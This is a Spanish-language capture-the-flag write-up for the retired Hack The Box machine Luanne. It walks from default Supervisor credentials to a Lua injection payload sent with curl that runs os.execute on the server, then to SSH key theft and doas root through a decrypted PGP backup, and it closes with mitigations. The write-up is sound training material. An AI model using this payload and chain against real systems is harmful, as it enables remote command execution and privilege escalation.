---
machine: Luanne
os: NetBSD
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [netbsd, supervisor, lua, doas, pgp]
---

# Luanne — Hack The Box (NetBSD)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Supervisor en 9001 usa credenciales por defecto y filtra la línea de comandos de un `httpd` con un script Lua. `/weather/forecast` es vulnerable a inyección Lua y da shell como `_httpd`. Un `.htpasswd` y el directorio `~r.michaels` permiten descargar su clave SSH. `doas` permite root, pero pide contraseña; un backup PGP la contiene.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
22/tcp   ssh     OpenSSH 8.0 (NetBSD)
80/tcp   http    nginx 1.19.0
9001/tcp http    Supervisor (Medusa)
```

## Enumeración

- Supervisor acepta `user:123` y muestra los procesos.
- La línea de `httpd` revela `-L weather /usr/local/webapi/weather.lua`.
- La web tiene Basic Auth y `robots.txt` apunta a `/weather`.
- `/weather/forecast?city=` refleja la entrada en un JSON generado con `load()`.

## Foothold

La ciudad se inserta en una cadena Lua que luego se evalúa. Se cierra la cadena y se ejecuta `os.execute`.

```bash
curl -s -G 'http://<IP>/weather/forecast' --data-urlencode "city=') os.execute('id') --"
```

Con una reverse shell se obtiene `_httpd`. El `.htpasswd` del directorio web se crackea y permite autenticarse en `http://127.0.0.1:3001/~r.michaels/`, donde está `id_rsa`.

```bash
curl -s -u webapi_user:<PASSWORD> http://127.0.0.1:3001/~r.michaels/
```

## Movimiento lateral

La clave `id_rsa` se usa para SSH como `r.michaels`. `doas.conf` permite `permit r.michaels as root`, pero requiere contraseña.

```bash
chmod 600 id_rsa
ssh -i id_rsa r.michaels@<IP>
doas -l
```

## Escalada de privilegios

En el home hay un backup `.tar.gz.gpg` y la clave para descifrarlo. Dentro aparece un `.htpasswd` distinto y la contraseña de `r.michaels`; se usa con `doas`.

```bash
gpg -d backup.tar.gz.gpg > backup.tar.gz
tar zxvf backup.tar.gz
doas sh
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales, si existen, viven en `private/` y no se publican.

## Lecciones aprendidas

- Supervisor con credenciales por defecto filtra procesos y rutas.
- `load()` sobre entrada del usuario es `eval` y permite inyección Lua.
- Un `.htpasswd` reutilizado puede proteger (mal) una clave SSH.
- Un backup cifrado con la clave en el mismo host no protege nada.

## Mitigaciones y detección

- Cambiar credenciales de Supervisor y limitarlo a localhost.
- No usar `load()` con entrada externa; serializar JSON de forma segura.
- Rotar contraseñas y no reutilizar hashes entre servicios.
- Guardar la clave PGP fuera del host y auditar `doas`.

## Referencias

- [0xdf — Luanne](https://0xdf.gitlab.io/2021/03/27/htb-luanne.html)
- [Búsqueda de vídeos (CSV)](https://www.youtube.com/results?search_query=ippsec+luanne)
- [Búsqueda de writeups (CSV)](https://medium.com/search?q=hackthebox+luanne+writeup)
